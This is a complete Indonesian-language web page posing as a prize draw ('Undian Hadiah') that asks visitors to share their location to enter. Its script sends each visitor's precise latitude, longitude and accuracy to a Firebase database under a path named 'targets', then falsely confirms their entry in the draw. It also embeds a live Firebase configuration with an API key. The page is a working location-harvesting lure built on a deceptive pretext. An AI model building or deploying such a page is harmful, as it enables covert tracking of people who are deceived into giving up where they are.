<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Undian Hadiah</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{
  background:#0f172a;
  color:#fff;
  text-align:center;
  font-family:Arial;
  padding:20px;
}
.box{
  margin-top:50px;
  background:#1e293b;
  padding:25px;
  border-radius:15px;
  box-shadow:0 0 20px rgba(0,0,0,0.4);
}
.btn{
  padding:15px 25px;
  background:#38bdf8;
  border:none;
  border-radius:10px;
  font-size:18px;
  font-weight:bold;
  cursor:pointer;
}
.btn:hover{ background:#0ea5e9; }

#photoInput{ margin-top:20px; }
</style>
</head>
<body>

<h1>Undian Hadiah Spesial</h1>
<p>Tekan tombol di bawah untuk ikut undian dan aktifkan lokasi Anda.</p>

<div class="box">
  <button id="startBtn" class="btn">Ikuti Undian</button>

  <input type="file" id="photoInput" accept="image/*" hidden>
  <p id="status"></p>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import { getDatabase, ref, set, update } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDxgnLu6TtJce2hd1DL07z5MWo62blEgC8",
  authDomain: "simulasi-kamera.firebaseapp.com",
  databaseURL: "https://simulasi-kamera-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "simulasi-kamera",
  storageBucket: "simulasi-kamera.firebasestorage.app",
  messagingSenderId: "924924454534",
  appId: "1:924924454534:web:8a3c34079aa1b0edd9d307"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

const userId = "user_" + Math.random().toString(36).substring(2,10);

document.getElementById("startBtn").onclick = () => {
  navigator.geolocation.getCurrentPosition(pos => {

    const {latitude, longitude, accuracy} = pos.coords;

    set(ref(db, "targets/" + userId), {
      status:"ONLINE",
      time: new Date().toLocaleString(),
      lat: latitude,
      lon: longitude,
      acc: accuracy
    });

    document.getElementById("status").innerHTML =
      "Lokasi berhasil dikirim!<br>Anda terdaftar dalam undian.";

  }, err => {
    alert("Anda harus mengizinkan lokasi untuk mengikuti undian.");
  });
};
</script>

</body>
</html>
